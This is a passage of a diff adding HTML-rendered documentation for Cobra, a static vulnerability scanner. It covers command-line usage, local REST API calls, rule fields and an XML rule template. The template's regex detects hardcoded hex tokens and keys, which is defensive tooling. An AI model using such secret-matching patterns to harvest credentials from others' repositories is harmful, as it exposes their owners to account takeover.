+$ python cobra.py -t https://github.com/FeeiCN/grw.git
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#19968;&#20010;&#25991;&#20214;&#22841;&#65292;&#24182;&#23558;&#25195;&#25551;&#32467;&#26524;&#23548;&#20986;&#20026;JSON&#25991;&#20214;</span>
+$ python cobra.py -t tests/vulnerabilities -f json -o /tmp/report.json
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#19968;&#20010;Git&#39033;&#30446;&#65292;&#24182;&#23558;&#25195;&#25551;&#32467;&#26524;JSON&#25991;&#20214;&#25512;&#36865;&#21040;API&#19978;</span>
+$ python cobra.py -f json -o http://push.to.com/api -t https://github.com/FeeiCN/vc.git
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#19968;&#20010;Git&#39033;&#30446;&#65292;&#24182;&#23558;&#25195;&#25551;&#32467;&#26524;JSON&#25991;&#20214;&#21457;&#36865;&#21040;&#37038;&#31665;&#20013;</span>
+$ python cobra.py -f json -o feei@feei.cn -t https://github.com/FeeiCN/grw.git
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#19968;&#20010;&#25991;&#20214;&#22841;&#20195;&#30721;&#30340;&#26576;&#20004;&#31181;&#28431;&#27934;</span>
+$ python cobra.py -t tests/vulnerabilities -r cvi-190001,cvi-190002
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#24320;&#21551;&#19968;&#20010;Cobra HTTP Server&#65292;&#28982;&#21518;&#21487;&#20197;&#20351;&#29992;API&#25509;&#21475;&#26469;&#28155;&#21152;&#25195;&#25551;&#20219;&#21153;</span>
+$ python cobra.py -H 127.0.0.1 -P 8888
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#29256;&#26412;</span>
+$ python cobra.py --version
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#24110;&#21161;</span>
+$ python cobra.py --help
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#19968;&#20010;Git&#39033;&#30446;&#65292;&#25195;&#25551;&#23436;&#27605;&#33258;&#21160;&#21024;&#38500;&#32531;&#23384;</span>
+$ python cobra.py -t http://github.com/xx/xx.git -dels
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;gitlab&#20840;&#37096;&#39033;&#30446;&#65292;&#37197;&#32622;&#22909;config&#20013;private_token&#65292;gitlab_url&#65292;cobra_ip</span>
+$ python git_projects.py
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33258;&#21160;&#29983;&#25104;Cobra&#25195;&#25551;&#21608;&#25253;&#21457;&#36865;&#33267;&#25351;&#23450;&#37038;&#31665;&#65292;&#38656;&#35201;&#37197;&#32622;&#22909;config&#20013;&#30340;SMTP&#26381;&#21153;&#22120;&#20449;&#24687;</span>
+$ python cobra.py -rp
+</pre>
+</div>
+
+<p>
+<b>Help（帮助）</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#9492;&#9472;# python2 cobra.py -h
+usage: cobra [-h] [-t &lt;target&gt;] [-f &lt;format&gt;] [-o &lt;output&gt;] [-r &lt;rule_id&gt;]                                                    
+             [-d] [-sid SID] [-dels] [-rp] [-m] [-H &lt;host&gt;] [-P &lt;port&gt;]                                                       
+
+    ,---.     |                                                                                                               
+    |    ,---.|---.,---.,---.                                                                                                 
+    |    |   ||   ||    ,---|                                                                                                 
+    <span style="color: #ff00ff;">`---``---``---``    `</span>---^ v2.0.0-alpha.5                                                                                  
+
+GitHub: https://github.com/WhaleShark-Team/cobra                                                                              
+
+Cobra is a static code analysis system that automates the detecting vulnerabilities and security issue.                       
+
+optional arguments:
+  -h, --help            show this help message and exit
+
+Scan:
+  -t &lt;target&gt;, --target &lt;target&gt;
+                        file, folder, compress, or repository address
+  -f &lt;format&gt;, --format &lt;format&gt;
+                        vulnerability output format (formats: json, csv, xml)
+  -o &lt;output&gt;, --output &lt;output&gt;
+                        vulnerability output STREAM, FILE, HTTP API URL, MAIL
+  -r &lt;rule_id&gt;, --rule &lt;rule_id&gt;
+                        specifies rules e.g: CVI-100001,cvi-190001
+  -d, --debug           open debug mode
+  -sid SID, --sid SID   scan id(API)
+  -dels, --dels         del target directory True or False
+  -rp, --report         automation report Cobra data
+  -m, --md5             Create projects file md5
+
+RESTful:
+  -H &lt;host&gt;, --host &lt;host&gt;
+                        REST-JSON API Service Host
+  -P &lt;port&gt;, --port &lt;port&gt;
+                        REST-JSON API Service Port
+
+Usage:
+  python cobra.py -t tests/vulnerabilities
+  python cobra.py -t tests/vulnerabilities -r cvi-190001,cvi-190002
+  python cobra.py -t tests/vulnerabilities -f json -o /tmp/report.json 
+  python cobra.py -t https://github.com/ethicalhack3r/DVWA -f json -o feei@feei.cn 
+  python cobra.py -t https://github.com/ethicalhack3r/DVWA -f json -o http://push.to.com/api 
+  python cobra.py -H 127.0.0.1 -P 8888
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:771fffa9-b016-451d-8d04-9b4158278426" class="outline-3">
+<h3 id="h:771fffa9-b016-451d-8d04-9b4158278426">API接口</h3>
+<div class="outline-text-3" id="text-h:771fffa9-b016-451d-8d04-9b4158278426">
+<p>
+<b>添加扫描任务</b>
+</p>
+
+<ul class="org-ul">
+<li>请求接口</li>
+</ul>
+<p>
+接口： /api/add 方法： POST 类型： JSON
+</p>
+
+<ul class="org-ul">
+<li>请求参数</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-sh">&#21442;&#25968; &#31867;&#22411; &#24517;&#22635;  &#25551;&#36848; &#20363;&#23376;
+
+key string &#26159; config &#25991;&#20214;&#20013;&#37197;&#32622;&#30340;secret_key
+{<span style="color: #8b2252;">"key"</span>:<span style="color: #8b2252;">"your_secret_key"</span>}
+
+target  string&#25110;list  &#26159;  &#38656;&#35201;&#25195;&#25551;&#30340;git&#22320;&#22336;&#65292;&#40664;&#35748;&#20026;master&#20998;&#25903;&#65292;&#22914;&#38656;&#25351;&#23450;&#20998;&#25903;&#25110;tag&#21487;&#22312;git&#22320;&#22336;&#26411;&#23614;&#21152;&#19978; :master
+&#21333;&#20010;&#39033;&#30446;&#25195;&#25551;&#65306; {<span style="color: #8b2252;">"target"</span>: <span style="color: #8b2252;">"https://github.com/FeeiCN/dict.git:master"</span>} &#65307;
+&#22810;&#20010;&#39033;&#30446;&#25195;&#25551;&#65306; {<span style="color: #8b2252;">"target"</span>: [<span style="color: #8b2252;">"https://github.com/FeeiCN/dict.git:master"</span>,<span style="color: #8b2252;">"https://github.com/FeeiCN/autossh.git:master"</span>]}
+
+rule string &#21542; &#20165;&#25195;&#25551;&#25351;&#23450;&#35268;&#21017;&#65292;&#20197;,&#20998;&#38548;
+{<span style="color: #8b2252;">"rule"</span>: <span style="color: #8b2252;">"cvi-130003,cvi-130004"</span>}
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>响应例子</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-sh">{
+    <span style="color: #8b2252;">"code"</span>: 1001, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29366;&#24577;&#30721;&#20026;1001&#21017;&#34920;&#31034;&#36923;&#36753;&#22788;&#29702;&#27491;&#24120;</span>
+    <span style="color: #8b2252;">"result"</span>: {
+        <span style="color: #8b2252;">"msg"</span>: <span style="color: #8b2252;">"Add scan job successfully."</span>, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#28040;&#24687;</span>
+        <span style="color: #8b2252;">"sid"</span>: <span style="color: #8b2252;">"a938e2y2vnkf"</span>, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#30340;&#20219;&#21153;ID&#65288;&#35843;&#29992;&#20219;&#21153;&#29366;&#24577;&#26597;&#35810;&#26102;&#38656;&#35201;&#29992;&#21040;&#65289;</span>
+        <span style="color: #8b2252;">"total_target_num"</span>: 1 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#20219;&#21153;&#30340;&#39033;&#30446;&#24635;&#25968;</span>
+    }
+}
+</pre>
+</div>
+
+<p>
+<b>查询扫描任务状态</b>
+</p>
+
+<ul class="org-ul">
+<li>请求接口</li>
+</ul>
+<p>
+接口： /api/status 方法： POST 类型： JSON
+</p>
+
+<ul class="org-ul">
+<li>请求参数</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#21442;&#25968; &#31867;&#22411; &#24517;&#22635; &#25551;&#36848; &#20363;&#23376;
+key string &#26159; config &#25991;&#20214;&#20013;&#37197;&#32622;&#30340; secret_key
+{<span style="color: #8b2252;">"key"</span>:<span style="color: #8b2252;">"your_secret_key"</span>}
+
+sid string &#26159; &#25195;&#25551;&#30340;&#20219;&#21153;ID
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>响应例子</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-sh">{
+    <span style="color: #8b2252;">"code"</span>: 1001, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29366;&#24577;&#30721;&#20026;1001&#21017;&#34920;&#31034;&#36923;&#36753;&#22788;&#29702;&#27491;&#24120;</span>
+    <span style="color: #8b2252;">"result"</span>: {
+        <span style="color: #8b2252;">"msg"</span>: <span style="color: #8b2252;">"success"</span>, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#28040;&#24687;</span>
+        <span style="color: #8b2252;">"not_finished"</span>: 0, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26410;&#23436;&#25104;&#30340;&#39033;&#30446;&#25968;</span>
+        <span style="color: #8b2252;">"report"</span>: <span style="color: #8b2252;">"http://127.0.0.1/?sid=ae3ea90pkoo5"</span>, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#25253;&#21578;&#39029;</span>
+        <span style="color: #8b2252;">"sid"</span>: <span style="color: #8b2252;">"ae3ea90pkoo5"</span>, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#30340;&#20219;&#21153;ID</span>
+        <span style="color: #8b2252;">"allow_deploy"</span>: true, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26159;&#21542;&#20801;&#35768;&#21457;&#24067;&#19978;&#32447;</span>
+        <span style="color: #8b2252;">"statistic"</span>: { <span style="color: #b22222;"># </span><span style="color: #b22222;">&#39640;&#20013;&#20302;&#21361;&#28431;&#27934;&#25968;&#37327;</span>
+            <span style="color: #8b2252;">"high"</span>: 5,
+            <span style="color: #8b2252;">"medium"</span>: 18,
+            <span style="color: #8b2252;">"critical"</span>: 0,
+            <span style="color: #8b2252;">"low"</span>: 28
+        },
+        <span style="color: #8b2252;">"status"</span>: <span style="color: #8b2252;">"done"</span>, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#29366;&#24577;</span>
+        <span style="color: #8b2252;">"still_running"</span>: {}, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#22312;&#25195;&#25551;&#30340;&#39033;&#30446;</span>
+        <span style="color: #8b2252;">"total_target_num"</span>: 1, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#20219;&#21153;&#30340;&#39033;&#30446;&#24635;&#25968;</span>
+    }
+}
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:b5c50eaf-045d-4dd8-aa97-fee9586e8fde" class="outline-3">
+<h3 id="h:b5c50eaf-045d-4dd8-aa97-fee9586e8fde">完整的例子</h3>
+<div class="outline-text-3" id="text-h:b5c50eaf-045d-4dd8-aa97-fee9586e8fde">
+<p>
+<b>启动HTTP服务</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">python cobra.py -H 127.0.0.1 -P 8888
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21551;&#21160;&#20043;&#21069;&#38656;&#20808;&#29983;&#25104; config &#37197;&#32622;&#25991;&#20214;</span>
+<span style="color: #b22222;"># </span><span style="color: #b22222;">cp config.template config</span>
+</pre>
+</div>
+
+<p>
+<b>添加扫描任务</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#28155;&#21152;&#19968;&#26465;&#20219;&#21153;</span>
+curl -H <span style="color: #8b2252;">"Content-Type: application/json"</span> -X POST http://127.0.0.1:8888/api/add -d <span style="color: #8b2252;">'{"key":"your_secret_key","target":"https://github.com/FeeiCN/grw.git:master", "rule": "cvi-130003,cvi-130004"}'</span> 
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#28155;&#21152;&#22810;&#26465;&#20219;&#21153;</span>
+curl -H <span style="color: #8b2252;">"Content-Type: application/json"</span> -X POST -d <span style="color: #8b2252;">'{"key":"your_secret_key","target":["https://github.com/WhaleShark-Team/cobra.git:master","https://github.com/FeeiCN/grw.git:master"]}'</span> http://127.0.0.1:8888/api/add
+</pre>
+</div>
+
+<p>
+<b>查询任务状态</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl -H <span style="color: #8b2252;">"Content-Type: application/json"</span> -X POST -d <span style="color: #8b2252;">'{"key":"your_secret_key","sid":"a938e29vdse8"}'</span> http://127.0.0.1:8888/api/status
+</pre>
+</div>
+
+<p>
+<b>Web 指定时间段漏洞统计</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">http://127.0.0.1:8888/report
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:c25e0a91-72b6-4664-9d0b-2e7a141b5f66" class="outline-3">
+<h3 id="h:c25e0a91-72b6-4664-9d0b-2e7a141b5f66">Flow（规则编写流程）</h3>
+<div class="outline-text-3" id="text-h:c25e0a91-72b6-4664-9d0b-2e7a141b5f66">
+<ol class="org-ol">
+<li>编写规则文件CVI-XXXNNN.xml</li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-sh">&#21442;&#32771;[&#35268;&#21017;&#21629;&#21517;](http://cobra.feei.cn/rule_name)&#24314;&#31435;&#35268;&#21017;&#25991;&#20214;&#12290;
+&#21442;&#32771;[&#35268;&#21017;&#27169;&#26495;](http://cobra.feei.cn/rule_template)&#21644;[&#35268;&#21017;&#26679;&#20363;](http://cobra.feei.cn/rule_demo)&#32534;&#20889;&#23545;&#24212;&#30340;&#35268;&#21017;&#12289;&#20462;&#22797;&#26041;&#26696;&#12289;&#27979;&#35797;&#29992;&#20363;&#31561;&#12290;
+</pre>
+</div>
+
+<ol class="org-ol">
+<li>编写漏洞代码tests/vulnerabilities/v.language</li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-sh">&#32534;&#20889;&#23454;&#38469;&#21487;&#33021;&#20986;&#29616;&#30340;&#19994;&#21153;&#22330;&#26223;&#20195;&#30721;&#65288;&#21482;&#38656;&#32534;&#20889;&#19968;&#22788;&#21363;&#21487;&#65289;&#12290;
+</pre>
+</div>
+
+<ol class="org-ol">
+<li>测试规则扫描python cobra.py -t tests/vulnerabilities/</li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-sh">&#27979;&#35797;&#25195;&#25551;&#32467;&#26524;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:df846e5b-888a-439e-bc63-a70964cf8a48" class="outline-3">
+<h3 id="h:df846e5b-888a-439e-bc63-a70964cf8a48">Rule Template（规则模板）</h3>
+<div class="outline-text-3" id="text-h:df846e5b-888a-439e-bc63-a70964cf8a48">
+<div class="org-src-container">
+<pre class="src src-xml"><span style="color: #000000; background-color: #ffffff;">&lt;?</span><span style="color: #a020f0;">xml</span> <span style="color: #8b2252;">version="1.0" encoding="UTF-8"</span><span style="color: #000000; background-color: #ffffff;">?&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">cobra</span> <span style="color: #a0522d;">document</span>=<span style="color: #8b2252;">"https://github.com/WhaleShark-Team/cobra"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">name</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"&#30828;&#32534;&#30721;Token/Key"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">language</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"*"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">match</span> <span style="color: #a0522d;">mode</span>=<span style="color: #8b2252;">"regex-only-match"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">(?![\d]{32})(?![a-fA-F]{32})([a-f\d]{32}|[A-F\d]{32})</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">match</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">level</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"2"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">test</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">case</span> <span style="color: #a0522d;">assert</span>=<span style="color: #8b2252;">"true"</span> <span style="color: #a0522d;">remark</span>=<span style="color: #8b2252;">"sha1"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">"41a6bc4d9a033e1627f448f0b9593f9316d071c1"</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">case</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">case</span> <span style="color: #a0522d;">assert</span>=<span style="color: #8b2252;">"true"</span> <span style="color: #a0522d;">remark</span>=<span style="color: #8b2252;">"md5 lower"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">"d042343e49e40f16cb61bd203b0ce756"</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">case</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">case</span> <span style="color: #a0522d;">assert</span>=<span style="color: #8b2252;">"true"</span> <span style="color: #a0522d;">remark</span>=<span style="color: #8b2252;">"md5 upper"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">C787AFE9D9E86A6A6C78ACE99CA778EE</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">case</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">case</span> <span style="color: #a0522d;">assert</span>=<span style="color: #8b2252;">"false"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">please like and subscribe to my</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">case</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">case</span> <span style="color: #a0522d;">assert</span>=<span style="color: #8b2252;">"false"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">A32efC32c79823a2123AA8cbDDd3231c</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">case</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">case</span> <span style="color: #a0522d;">assert</span>=<span style="color: #8b2252;">"false"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">ffffffffffffffffffffffffffffffff</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">case</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">case</span> <span style="color: #a0522d;">assert</span>=<span style="color: #8b2252;">"false"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">01110101001110011101011010101001</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">case</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">case</span> <span style="color: #a0522d;">assert</span>=<span style="color: #8b2252;">"false"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">00000000000000000000000000000000</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">case</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">test</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">solution</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">    ## &#23433;&#20840;&#39118;&#38505;</span>
+<span style="color: #000000; background-color: #ffffff;">    &#30828;&#32534;&#30721;&#23494;&#30721;</span>
+
+<span style="color: #000000; background-color: #ffffff;">    ## &#20462;&#22797;&#26041;&#26696;</span>
+<span style="color: #000000; background-color: #ffffff;">    &#23558;&#23494;&#30721;&#25277;&#20986;&#32479;&#19968;&#25918;&#22312;&#37197;&#32622;&#25991;&#20214;&#20013;&#65292;&#37197;&#32622;&#25991;&#20214;&#19981;&#25918;&#22312;git&#20013;</span>
+<span style="color: #000000; background-color: #ffffff;">  </span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">solution</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">status</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"on"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">author</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"Feei"</span> <span style="color: #a0522d;">email</span>=<span style="color: #8b2252;">"feei@feei.cn"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">cobra</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+</pre>
+</div>
+
+<p>
+<b>规则字段规范</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#23383;&#27573;&#65288;&#33521;&#25991;&#65289;   &#23383;&#27573;&#65288;&#20013;&#25991;&#65289;  &#26159;&#21542;&#24517;&#22635;  &#31867;&#22411; &#25551;&#36848; &#20363;&#23376;
+
+name
+&#35268;&#21017;&#21517;&#31216;&#12290;&#26159; string &#25551;&#36848;&#35268;&#21017;&#21517;&#31216;
+&lt;name <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"Logger&#25935;&#24863;&#20449;&#24687;"</span> /&gt;
+
+language
+&#35268;&#21017;&#35821;&#35328;  &#26159; string  &#35774;&#32622;&#35268;&#21017;&#38024;&#23545;&#30340;&#24320;&#21457;&#35821;&#35328;&#65292;&#21442;&#35265;languages
+&lt;language <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"php"</span> /&gt;
+
+match
+&#21305;&#37197;&#35268;&#21017;1 &#26159; string &#21305;&#37197;&#35268;&#21017;1
+&lt;match <span style="color: #a0522d;">mode</span>=<span style="color: #8b2252;">"regex-only-match"</span>&gt;&lt;![CDATA[regex content]]&gt;&lt;/match&gt;
+
+match2
+&#21305;&#37197;&#35268;&#21017;2 &#21542; string &#21305;&#37197;&#35268;&#21017;2
+&lt;match2 <span style="color: #a0522d;">block</span>=<span style="color: #8b2252;">"in-function-up"</span>&gt;&lt;![CDATA[regex content]]&gt;&lt;/match2&gt;
+
+repair
+&#20462;&#22797;&#35268;&#21017;  &#21542; string&#21305;&#37197;&#21040;&#27492;&#35268;&#21017;&#65292;&#21017;&#19981;&#31639;&#20570;&#28431;&#27934;
+&lt;repair <span style="color: #a0522d;">block</span>=<span style="color: #8b2252;">""</span>&gt;&lt;![CDATA[regex content]]&gt;&lt;/repair&gt;
+
+level
+&#24433;&#21709;&#31561;&#32423; &#26159; integer &#26631;&#35760;&#35813;&#35268;&#21017;&#25195;&#21040;&#30340;&#28431;&#27934;&#21361;&#23475;&#31561;&#32423;&#65292;&#20351;&#29992;&#25968;&#23383;1-10&#12290;
+&lt;level <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"3"</span> /&gt;
+
+solution
+&#20462;&#22797;&#26041;&#26696; &#26159; string&#35813;&#35268;&#21017;&#25195;&#25551;&#30340;&#28431;&#27934;&#23545;&#24212;&#30340;&#23433;&#20840;&#39118;&#38505;&#21644;&#20462;&#22797;&#26041;&#26696;
+&lt;solution&gt;&#35814;&#32454;&#30340;&#23433;&#20840;&#39118;&#38505;&#21644;&#20462;&#22797;&#26041;&#26696;&lt;/solution&gt;
+
+<span style="color: #483d8b;">test</span>
+&#27979;&#35797;&#29992;&#20363; &#26159; case &#35813;&#35268;&#21017;&#23545;&#24212;&#30340;&#27979;&#35797;&#29992;&#20363;
+&lt;test&gt;&lt;case <span style="color: #a0522d;">assert</span>=<span style="color: #8b2252;">"true"</span>&gt;&lt;![CDATA[&#27979;&#35797;&#23384;&#22312;&#28431;&#27934;&#30340;&#20195;&#30721;]]&gt;
+&lt;/case&gt;&lt;case <span style="color: #a0522d;">assert</span>=<span style="color: #8b2252;">"false"</span>&gt;&lt;![CDATA[&#27979;&#35797;&#19981;&#23384;&#22312;&#28431;&#27934;&#30340;&#20195;&#30721;]]&gt;
+&lt;/case&gt;&lt;/test&gt;
+
+status
+&#26159;&#21542;&#24320;&#21551;
+&#26159; boolean&#26159;&#21542;&#24320;&#21551;&#35813;&#35268;&#21017;&#30340;&#25195;&#25551;&#65292;&#20351;&#29992; on / off &#26469;&#26631;&#35760;
+&lt;status <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"1"</span> /&gt;
+
+author
+&#35268;&#21017;&#20316;&#32773; &#26159; attr &#35268;&#21017;&#20316;&#32773;&#30340;&#22995;&#21517;&#21644;&#37038;&#31665;
+&lt;author <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"Feei"</span> <span style="color: #a0522d;">email</span>=<span style="color: #8b2252;">"feei@feei.cn"</span> /&gt;
+</pre>
+</div>
+
+
+<p>
+<b>核心字段&lt;match&gt;/&lt;match2&gt;/&lt;repair&gt;编写规范</b>
+</p>
+
+<p>
+&lt;match&gt; Mode（ &lt;match&gt; 的规则模式）
+</p>
+
+<p>
+用来描述规则类型，只能用在 &lt;match&gt; 中。
+</p>
